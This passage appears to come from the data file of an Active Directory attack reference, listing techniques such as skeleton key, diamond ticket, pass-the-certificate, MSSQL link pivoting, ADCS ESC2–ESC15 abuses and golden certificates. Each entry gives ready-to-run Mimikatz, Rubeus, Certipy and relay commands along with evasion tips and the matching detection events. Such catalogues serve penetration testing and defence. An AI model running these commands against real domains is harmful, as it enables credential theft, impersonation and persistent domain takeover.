    tools: [{ name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' }],
    commands: [
      { label: 'Inject the skeleton key on a DC', code: r`mimikatz # privilege::debug` + '\n' + r`mimikatz # misc::skeleton`, lang: 'powershell' },
      { label: 'Authenticate with the master password', code: r`net use \\dc01\admin$ /user:domain\anyuser mimikatz`, lang: 'cmd' },
    ],
    requires: ['Domain Admin / SYSTEM on a Domain Controller', 'Code execution on the DC to run mimikatz'],
    mitre: mitre('T1556.001'),
    references: [
      {
        label: 'Secureworks CTU, Skeleton Key Malware Analysis (original discovery)',
        url: 'https://www.secureworks.com/research/skeleton-key-malware-analysis',
      },
      { label: 'The Hacker Recipes, Skeleton key', url: 'https://www.thehacker.recipes/ad/persistence/skeleton-key/' },
    ],
    opsec: 'Patching LSASS on a DC is high-signal and lost on reboot; the forced RC4 downgrade is itself anomalous. LSASS as a Protected Process (RunAsPPL) blocks the patch.',
    difficulty: 'medium',
  },
  {
    id: 'diamond-ticket',
    label: 'Diamond Ticket',
    phase: 'domain-dominance',
    summary: 'Modify a real KDC-issued TGT with the krbtgt key.',
    description:
      'Rather than forging a TGT from scratch (golden ticket), a diamond ticket requests a legitimate TGT from the DC, decrypts it with the krbtgt key (AES256 preferred), edits the PAC (e.g. add Domain Admins), then re-encrypts and re-signs it. Because a genuine AS-REQ precedes its use, it evades golden-ticket detections that flag a TGS with no preceding AS exchange.',
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'ticketer (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Craft a diamond TGT (Rubeus)', code: r`Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:<KRBTGT_AES256> /nowrap`, lang: 'powershell' },
      { label: 'Request + modify with ticketer', code: r`ticketer.py -request -domain domain.local -user user -password pass -aesKey <KRBTGT_AES256> -domain-sid <SID> -groups 512 Administrator`, lang: 'bash' },
    ],
    requires: ['The krbtgt AES256 key (or NT hash)', 'A valid set of domain credentials to request the base TGT'],
    mitre: mitre('T1558.001'),
    references: [
      { label: 'HackTricks, Diamond Ticket', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/diamond-ticket.html' },{ label: 'The Hacker Recipes, Diamond tickets', url: 'https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond' }],
    opsec: 'Stealthier than a golden ticket because a real AS-REQ precedes the TGS; use /opsec (Rubeus) to mimic a Windows AS-REQ and stick to AES256. PAC values that diverge from the account\'s real group memberships can still be caught by PAC validation.',
    difficulty: 'hard',
  },
  {
    id: 'pass-the-certificate',
    label: 'Pass-the-Certificate',
    phase: 'credential-access',
    summary: 'PKINIT with a client-auth cert -> TGT, then UnPAC the NT hash.',
    description:
      'A certificate with the Client Authentication EKU (from ADCS abuse, shadow credentials, or a stolen PFX) can pre-authenticate via PKINIT to obtain a Kerberos TGT for that principal. UnPAC-the-hash then recovers the account\'s NT hash from the PAC (using the AS-REP key), giving you both a usable ticket and a reusable hash without ever knowing the password.',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'PKINITtools', url: 'https://github.com/dirkjanm/PKINITtools' },
    ],
    commands: [
      { label: 'Auth with a PFX -> TGT + NT hash (Certipy)', code: r`certipy auth -pfx user.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
      { label: 'Get a TGT via PKINIT (PKINITtools)', code: r`gettgtpkinit.py domain.local/user -cert-pfx user.pfx user.ccache`, lang: 'bash' },
      { label: 'UnPAC the NT hash from the AS-REP key', code: r`getnthash.py domain.local/user -key <AS_REP_KEY>`, lang: 'bash' },
    ],
    requires: ['A certificate (PFX) with Client Authentication EKU for the target', 'A PKINIT-capable KDC (AD CS / KDC cert)'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Account Persistence', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html' },
      { label: 'Certipy wiki, Authentication (Pass the Certificate / PKINIT)', url: 'https://github.com/ly4k/Certipy/wiki/07-%E2%80%90-Authentication' },
      { label: 'The Hacker Recipes, UnPAC the hash', url: 'https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash' },
    ],
    opsec: 'PKINIT logons are auditable (4768 with certificate info) and certificates outlive password resets, making them durable. Certipy auth performs UnPAC-the-hash automatically after obtaining the TGT.',
    difficulty: 'medium',
  },
  {
    id: 'mssql-linked-servers',
    label: 'MSSQL Linked Servers',
    phase: 'lateral-movement',
    summary: 'Pivot through trusted MSSQL links -> xp_cmdshell.',
    description:
      'MSSQL linked servers let one instance query another, often executing on the remote side under a higher-privileged mapped login. By chaining EXECUTE AT / OPENQUERY across links you can crawl from a low-priv login to a sysadmin context on another SQL host, then enable and run xp_cmdshell to get OS command execution as the (frequently privileged) SQL service account.',
    tools: [
      { name: 'mssqlclient (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'PowerUpSQL', url: 'https://github.com/NetSPI/PowerUpSQL' },
      { name: 'NetExec (enum_links)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Connect (Windows auth)', code: r`mssqlclient.py -windows-auth domain.local/user:pass@10.0.0.30`, lang: 'bash' },
      { label: 'Enumerate links, hop, exec', code: r`enum_links` + '\n' + r`use_link LINKED-SQL` + '\n' + r`enable_xp_cmdshell` + '\n' + r`xp_cmdshell whoami`, lang: 'sql' },
      { label: 'Crawl all links (PowerUpSQL)', code: r`Get-SQLServerLinkCrawl -Instance sql01 -Query "exec master..xp_cmdshell 'whoami'"`, lang: 'powershell' },
      { label: 'Enumerate linked servers (NetExec)', code: r`nxc mssql <host> -u user -p pass -M enum_links`, lang: 'bash' },
      { label: 'OS command on a linked server (NetExec)', code: r`nxc mssql <host> -u user -p pass -M link_xpcmd -o LINKED_SERVER=SQL02 CMD='whoami'`, lang: 'bash' },
    ],
    requires: ['A valid MSSQL login (Windows or SQL auth)', 'One or more linked servers with usable login mappings'],
    mitre: mitre('T1210'),
    references: [{ label: 'HackTricks, Abusing AD MSSQL', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/abusing-ad-mssql.html' }],
    opsec: 'xp_cmdshell spawns processes under the SQL Server service account (4688) and is disabled by default; enabling it via sp_configure is logged. Linked-server hops appear as distributed queries in SQL audit/trace.',
    difficulty: 'medium',
  },
  {
    id: 'adcs-esc4',
    label: 'ADCS ESC4 (Template ACL)',
    phase: 'priv-esc',
    summary: 'Write a cert template into an ESC1-vulnerable state, then enroll.',
    description:
      'ESC4 is a dangerous ACL (WriteOwner/WriteDacl/WriteProperty/GenericAll, BloodHound: ADCSESC4) over a certificate template object rather than over the issued certs. Rewrite the template to be ESC1-vulnerable (enable Client Authentication EKU and ENROLLEE_SUPPLIES_SUBJECT and open enrollment), then perform the ESC1 attack to impersonate a Domain Admin, and restore the template afterward.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Make the template ESC1-vulnerable (Certipy v5 auto-saves the original)', code: r`certipy template -u user@domain.local -p pass -dc-ip 10.0.0.1 -template VulnTemplate -write-default-configuration`, lang: 'bash' },
      { label: 'Then run the ESC1 enrollment', code: r`certipy req -u user@domain.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@domain.local`, lang: 'bash' },
      { label: 'Restore the original template config', code: r`certipy template -u user@domain.local -p pass -dc-ip 10.0.0.1 -template VulnTemplate -write-configuration VulnTemplate.json -no-save`, lang: 'bash' },
    ],
    requires: ['A dangerous write ACL over a certificate template', 'A reachable, enabled CA to enroll against'],
    mitre: mitre('T1649'),
    references: [
      { label: 'Certipy wiki, Privilege Escalation (ESC4)', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
      { label: 'HackTricks, AD CS Domain Escalation (ESC4)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'The Hacker Recipes, AD CS', url: 'https://www.thehacker.recipes/ad/movement/adcs/' },
    ],
    opsec: 'Editing a template is a directory write (5136) and momentarily exposes an over-permissive template domain-wide; the subsequent cross-account cert request is logged on the CA (4886/4887). Restore the template promptly to limit the window.',
    difficulty: 'hard',
  },
  {
    id: 'adcs-esc2',
    label: 'ADCS ESC2 (Any Purpose / No EKU)',
    phase: 'priv-esc',
    summary: 'Template with Any-Purpose (or no) EKU -> use as enrollment agent.',
    description:
      'ESC2 is a template whose EKU is "Any Purpose" (or has no EKU at all), so the issued certificate can be used for anything, including acting as an enrollment agent. Unlike ESC1 you cannot specify an arbitrary SAN directly, but you can enroll, then use that cert to request a client-auth certificate on behalf of a privileged user (the ESC3 abuse), and authenticate as them.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Request the Any-Purpose certificate', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template AnyPurpose`, lang: 'bash' },
      { label: 'Use it on behalf of a target', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template User -pfx user.pfx -on-behalf-of 'CORP\administrator'`, lang: 'bash' },
      { label: 'Authenticate as the target', code: r`certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['Enrollment rights on a template with Any-Purpose or no EKU', 'A reachable, enabled CA'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC2)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'The Hacker Recipes, Certificate templates', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' },
    ],
    opsec: 'Cert requests are logged on the CA (4886/4887); an on-behalf-of request whose subject differs from the requester is a strong signal. Certificates outlive password resets.',
    difficulty: 'medium',
  },
  {
    id: 'adcs-esc3',
    label: 'ADCS ESC3 (Enrollment Agent)',
    phase: 'priv-esc',
    summary: 'Enroll a Certificate Request Agent cert -> request on behalf of anyone.',
    description:
      'ESC3 is a template carrying the Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1) open to low-priv enrollment. Enroll to obtain an enrollment-agent certificate, then use it to request a client-authentication certificate on behalf of a privileged user from a second (e.g. default "User") template, and authenticate as that user.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Get the enrollment-agent cert', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template EnrollmentAgent`, lang: 'bash' },
      { label: 'Request a cert on behalf of a target', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template User -pfx user.pfx -on-behalf-of 'CORP\administrator'`, lang: 'bash' },
      { label: 'Authenticate as the target', code: r`certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['Enrollment rights on a Certificate Request Agent template', 'A second client-auth template enabled on the CA'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC3)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'The Hacker Recipes, Certificate templates', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' },
    ],
    opsec: 'Enrollment-agent enrollment and the subsequent on-behalf-of request are both logged on the CA (4886/4887). Enrollment-agent restrictions on the CA can constrain who an agent may enroll for.',
    difficulty: 'medium',
  },
  {
    id: 'adcs-esc5',
    label: 'ADCS ESC5 (PKI Object ACL)',
    phase: 'priv-esc',
    summary: 'Weak ACL on a PKI AD object / CA host -> compromise the PKI.',
    description:
      'ESC5 covers vulnerable access control over the wider PKI footprint rather than a single template: the CA computer object, the CA server host, and AD objects under the Public Key Services container (Certificate Templates, Enrollment Services, NTAuthCertificates, AIA/CDP). Control over any of these lets you reconfigure the PKI (e.g. take over the CA host, push a rogue CA into NTAuth, or grant yourself rights), which generally collapses into a golden-certificate / forging position.',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'Enumerate PKI objects & ACLs', code: r`certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -stdout`, lang: 'bash' },
      { label: 'After CA-host takeover: back up the CA key', code: r`certipy ca -u user@domain.local -p pass -target ca.domain.local -ca CORP-CA -backup`, lang: 'bash' },
    ],
    requires: ['A dangerous ACL over a PKI AD object or the CA host', 'Owned principal holding that ACL'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC5)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'The Hacker Recipes, Access controls', url: 'https://www.thehacker.recipes/ad/movement/adcs/access-controls' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' },
    ],
    opsec: 'No single clean technique: outcome depends on the object abused. DACL writes on PKI objects generate 4662/5136; CA-host takeover and key export are highly privileged actions. (T1649 once forging begins.)',
    difficulty: 'hard',
  },
  {
    id: 'adcs-esc6',
    label: 'ADCS ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)',
    phase: 'priv-esc',
    summary: 'CA-wide flag lets any request specify an arbitrary SAN.',
    description:
      'When the CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, it honours a requester-supplied subjectAltName on ANY template, so even a benign client-auth template (e.g. the default User) becomes ESC1-like. Request a certificate with an arbitrary UPN/SID and authenticate as that user. Post-May-2022 patches mean it must be combined with a SID-mapping gap (ESC9/ESC16) to fully impersonate.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Detect the flag', code: r`certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -stdout`, lang: 'bash' },
      { label: 'Request with an arbitrary SAN', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template User -upn administrator@domain.local -sid S-1-5-21-...-500`, lang: 'bash' },
      { label: 'Authenticate as the target', code: r`certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['EDITF_ATTRIBUTESUBJECTALTNAME2 set on the CA', 'Enrollment on any client-auth template', 'Often a SID-mapping gap (ESC9/ESC16) post-patch'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC6)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'The Hacker Recipes, Certificate authority', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-authority' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' },
    ],
    opsec: 'The misconfig is CA-wide and easy to flag with Certipy; cross-account requests are logged (4886/4887). Setting/clearing the flag requires CertSvc restart and is itself auditable.',
    difficulty: 'medium',
  },
  {
    id: 'adcs-esc7',
    label: 'ADCS ESC7 (Vulnerable CA ACL)',
    phase: 'priv-esc',
    summary: 'ManageCA / Manage Certificates on the CA -> issue arbitrary certs.',
    description:
      'ESC7 is a dangerous ACL on the CA itself: the ManageCA ("CA Administrator") or Manage Certificates ("Certificate Manager") right. With ManageCA you can grant yourself the officer/Manage-Certificates right, enable the built-in SubCA template, submit a request that gets denied, then approve your own pending request and retrieve the cert. ManageCA can also flip EDITF_ATTRIBUTESUBJECTALTNAME2 to enable ESC6.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Grant yourself officer (Manage Certificates)', code: r`certipy ca -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -add-officer user`, lang: 'bash' },
      { label: 'Enable the SubCA template', code: r`certipy ca -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -enable-template SubCA`, lang: 'bash' },
      { label: 'Request SubCA (gets denied -> note the request id)', code: r`certipy req -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -template SubCA -upn administrator@domain.local`, lang: 'bash' },
      { label: 'Approve the pending request', code: r`certipy ca -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -issue-request 17`, lang: 'bash' },
      { label: 'Retrieve the issued cert', code: r`certipy req -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -retrieve 17`, lang: 'bash' },
    ],
    requires: ['ManageCA or Manage Certificates over the CA', 'A reachable CA host'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC7)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'The Hacker Recipes, Access controls', url: 'https://www.thehacker.recipes/ad/movement/adcs/access-controls' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' },
    ],
    opsec: 'CA configuration/permission changes and request approvals are logged on the CA (4882/4885/4887). The SubCA dance leaves a denied-then-issued request trail; enabling SubCA exposes a powerful template briefly.',
    difficulty: 'hard',
  },
  {
    id: 'adcs-esc9',
    label: 'ADCS ESC9 (No Security Extension)',
    phase: 'priv-esc',
    summary: 'Template lacks the SID extension -> UPN-swap impersonation.',
    description:
      'ESC9 templates set CT_FLAG_NO_SECURITY_EXTENSION in msPKI-Enrollment-Flag, so the issued certificate omits the szOID_NTDS_CA_SECURITY_EXT (SID) extension and the KDC falls back to UPN-based mapping. With write rights over a victim account, set its userPrincipalName to a target (e.g. administrator), enroll as the victim, revert the UPN, then authenticate: the cert maps to the target. Needs StrongCertificateBindingEnforcement not in full-enforcement (2) mode.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Get the victim NT hash (shadow creds)', code: r`certipy shadow auto -u user@domain.local -p pass -account victim -dc-ip 10.0.0.1`, lang: 'bash' },
      { label: "Swap the victim's UPN to the target", code: r`certipy account update -u user@domain.local -p pass -user victim -upn administrator@domain.local`, lang: 'bash' },
      { label: 'Enroll as the victim on the ESC9 template', code: r`certipy req -u victim@domain.local -hashes :<victim_nt> -dc-ip 10.0.0.1 -ca CORP-CA -template ESC9`, lang: 'bash' },
      { label: 'Revert UPN, then auth as the target', code: r`certipy account update -u user@domain.local -p pass -user victim -upn victim@domain.local`, lang: 'bash' },
    ],
    requires: ['Template with CT_FLAG_NO_SECURITY_EXTENSION + client auth', 'GenericWrite over a victim account', 'StrongCertificateBindingEnforcement != 2'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC9)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' },
      { label: 'The Hacker Recipes, Certificate templates', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates' },
      { label: 'Certipy wiki, Privilege Escalation', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
    ],
    opsec: 'The UPN edits on the victim (5136) bracket the attack and should be reverted; cert request and PKINIT logon are logged. The KB5014754 full-enforcement mode (2) breaks ESC9.',
    difficulty: 'hard',
  },
  {
    id: 'adcs-esc10',
    label: 'ADCS ESC10 (Weak Cert Mappings)',
    phase: 'priv-esc',
    summary: 'Weak DC mapping registry -> UPN-swap or altSecID impersonation.',
    description:
      'ESC10 abuses weak certificate-to-account mapping on the DCs. Case 1, StrongCertificateBindingEnforcement = 0: like ESC9, write a victim UPN to the target and enroll/auth (no SID extension required). Case 2, CertificateMappingMethods = 0x4 (UPN-only): repoint a victim UPN at an account with no UPN (a machine account or built-in Administrator) and authenticate as it, typically via Schannel/LDAP. Both turn a write-over-a-victim edge into impersonation.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: "Case 1: swap victim's UPN to target", code: r`certipy account update -u user@domain.local -p pass -user victim -upn administrator@domain.local`, lang: 'bash' },
      { label: 'Case 2: point victim UPN at a machine account', code: r`certipy account update -u user@domain.local -p pass -user victim -upn 'DC01$@domain.local'`, lang: 'bash' },
      { label: 'Enroll as victim then auth (LDAP shell)', code: r`certipy req -u victim@domain.local -hashes :<victim_nt> -ca CORP-CA -template User` + '\n' + r`certipy auth -pfx victim.pfx -dc-ip 10.0.0.1 -ldap-shell`, lang: 'bash' },
    ],
    requires: ['StrongCertificateBindingEnforcement = 0 (Case 1) or CertificateMappingMethods = 0x4 (Case 2)', 'GenericWrite over a victim account', 'A client-auth template open to the victim'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC10)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' },
      { label: 'The Hacker Recipes, Certificate templates', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates' },
      { label: 'Certipy wiki, Privilege Escalation', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
    ],
    opsec: 'Relies on misconfigured DC registry mappings KB5014754 is meant to harden. UPN writes (5136) should be reverted; Case 2 commonly drives an LDAP/Schannel session rather than PKINIT.',
    difficulty: 'hard',
  },
  {
    id: 'adcs-esc11',
    label: 'ADCS ESC11 (Relay to ICertPassage/RPC)',
    phase: 'priv-esc',
    summary: 'Relay coerced NTLM to the CA RPC (ICPR) enrollment endpoint.',
    description:
      'ESC11 is the RPC analogue of ESC8: if the CA MS-ICPR RPC interface does not require packet privacy (IF_ENFORCEENCRYPTICERTREQUEST not set), coerced NTLM can be relayed to the ICertPassage endpoint to enroll a certificate for the victim principal. Relay a coerced DC to obtain a DC certificate, then authenticate for a TGT and DCSync.',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'Coercer', url: 'https://github.com/p0dalirius/Coercer' },
    ],
    commands: [
      { label: 'Relay to the CA RPC endpoint (Certipy)', code: r`certipy relay -target 'rpc://ca.domain.local' -ca CORP-CA -template DomainController`, lang: 'bash' },
      { label: 'ntlmrelayx ICPR equivalent', code: r`ntlmrelayx.py -t rpc://ca.domain.local -rpc-mode ICPR -icpr-ca-name CORP-CA -smb2support --template DomainController`, lang: 'bash' },
      { label: 'Then coerce the DC to authenticate', code: r`Coercer coerce -u user -p pass -t dc01.domain.local -l 10.0.0.50`, lang: 'bash' },
    ],
    requires: ['CA RPC (ICPR) without enforced encryption (IF_ENFORCEENCRYPTICERTREQUEST unset)', 'A coercion vector to a privileged machine'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC11)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'Compass Security, Relaying to AD CS over RPC', url: 'https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/' },
      { label: 'SpecterOps, ESC11', url: 'https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc11-ntlm-relay-to-ad-cs-rpc-interfaces' },
    ],
    opsec: 'Coercion is noisy and the relayed cross-account enrollment is logged on the CA. Enforcing RPC packet privacy on the CA mitigates it. Have the relay listener up before coercing.',
    difficulty: 'hard',
  },
  {
    id: 'adcs-esc13',
    label: 'ADCS ESC13 (Issuance Policy -> Group)',
    phase: 'priv-esc',
    summary: 'Enroll a template whose policy OID is linked to a privileged group.',
    description:
      'ESC13 abuses an issuance policy OID (in msPKI-Certificate-Policy) that is linked, via the OID object msDS-OIDToGroupLink, to an AD group. Authenticating with a certificate from such a template injects that group membership into the token. If a template you can enroll is linked to a privileged group (e.g. a group nested into Domain Admins), enroll and authenticate to inherit those rights, with no SAN spoofing needed.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Find OID-group-linked templates', code: r`certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -vulnerable -stdout`, lang: 'bash' },
      { label: 'Enroll the linked template', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template ESC13Template`, lang: 'bash' },
      { label: 'Authenticate -> token gains the linked group', code: r`certipy auth -pfx user.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['Enrollment on a template with a group-linked issuance policy', 'The linked group grants useful privileges'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC13)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'SpecterOps, ADCSESC13', url: 'https://bloodhound.specterops.io/resources/edges/adcs-esc13' },
      { label: 'The Hacker Recipes, Certificate templates', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates' },
    ],
    opsec: 'Enrollment looks legitimate (no SAN spoof), making ESC13 subtle; the cert request is still logged (4886/4887) and the OID-to-group link is discoverable in AD. The injected group membership appears in the resulting logon.',
    difficulty: 'medium',
  },
  {
    id: 'adcs-esc15',
    label: 'ADCS ESC15 (EKUwu / CVE-2024-49019)',
    phase: 'priv-esc',
    summary: 'Inject application policies into a v1 template CSR (EKUwu).',
    description:
      'ESC15 (EKUwu, CVE-2024-49019) abuses schema-version-1 templates that allow enrollee-supplied subjects: an attacker injects arbitrary Application Policies into the CSR, and the CA embeds them in the issued cert regardless of the template EKU. Inject Client Authentication (1.3.6.1.5.5.7.3.2) for an ESC1-style impersonation, or Certificate Request Agent (1.3.6.1.4.1.311.20.2.1) for an ESC3-style on-behalf-of. Because the cert EKU may not satisfy PKINIT, authentication is often done over LDAP/Schannel (PassTheCert).',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'PassTheCert', url: 'https://github.com/AlmondOffSec/PassTheCert' },
    ],
    commands: [
      { label: 'Inject Client Auth into a v1 template CSR', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template WebServer -upn administrator@domain.local -application-policies '1.3.6.1.5.5.7.3.2'`, lang: 'bash' },
      { label: 'Authenticate over LDAP (Schannel) shell', code: r`certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 -ldap-shell`, lang: 'bash' },
      { label: 'Or inject Enrollment Agent for ESC3-style abuse', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1'`, lang: 'bash' },
    ],
    requires: ['A schema-version-1 template with enrollee-supplied subject', 'Enrollment rights', 'Unpatched CA (CVE-2024-49019)'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC15)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'TrustedSec, EKUwu', url: 'https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc' },
      { label: 'SpecterOps, ESC15', url: 'https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc15-ekuwu-application-policy-injection' },
    ],
    opsec: 'The `-application-policies` flag is recent; verify your Certipy build supports it (Certify uses `--application-policy`). PKINIT may reject the cert (EKU mismatch), so LDAP/Schannel auth via PassTheCert is the reliable path. Patched (Nov 2024) CAs ignore the injected policy.',
    difficulty: 'hard',
  },
  {
    id: 'golden-certificate',
    label: 'Golden Certificate (Forge CA)',
    phase: 'persistence',
    summary: 'Steal the CA private key -> forge certs for any principal forever.',
    description:
      'With the CA private key (extracted after compromising the CA host, e.g. via ESC5/ESC7 or DA), you can forge a client-authentication certificate for ANY domain principal offline: no enrollment, no CA interaction. This "golden certificate" survives password resets and persists until the CA cert expires or is revoked, making it a durable domain-persistence primitive.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Back up the CA cert + private key', code: r`certipy ca -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -backup`, lang: 'bash' },
      { label: 'Forge a cert for any principal', code: r`certipy forge -ca-pfx CORP-CA.pfx -upn administrator@domain.local -sid S-1-5-21-...-500`, lang: 'bash' },
      { label: 'Authenticate with the forged cert', code: r`certipy auth -pfx administrator_forged.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['Access to the CA private key (CA host compromise / ESC5 / ESC7 / DA)'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Persistence', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-persistence.html' },
      { label: 'The Hacker Recipes, AD CS', url: 'https://www.thehacker.recipes/ad/movement/adcs/' },
      { label: 'Certipy wiki, Golden Certificates', url: 'https://github.com/ly4k/Certipy/wiki' },
    ],
    opsec: 'Forging happens entirely offline, so it is far quieter than enrollment, but exporting the CA private key is highly privileged and detectable on the CA host. Forged certs are only invalidated by CA key rotation/revocation, not password changes.',
    difficulty: 'hard',
  },
  {
    id: 'domain-object-enum',
    label: 'Domain Object Enumeration',
